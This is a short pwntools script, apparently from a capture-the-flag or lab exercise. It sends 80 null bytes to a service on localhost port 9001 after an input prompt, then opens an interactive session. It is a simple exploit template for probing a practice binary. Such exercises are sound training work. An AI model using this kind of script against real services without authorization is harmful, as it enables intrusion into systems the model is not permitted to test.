from pwn import *

payload = b'\x00' * 80
print(f"Payload length: {len(payload)}")
print(f"All bytes are null: {all(b == 0 for b in payload)}")

#io = process('./main')
io = remote('localhost',9001)
io.recvuntil(b'input: ')  # Wait for prompt
io.send(payload)
time.sleep(0.1)  # Give it time to process
io.interactive()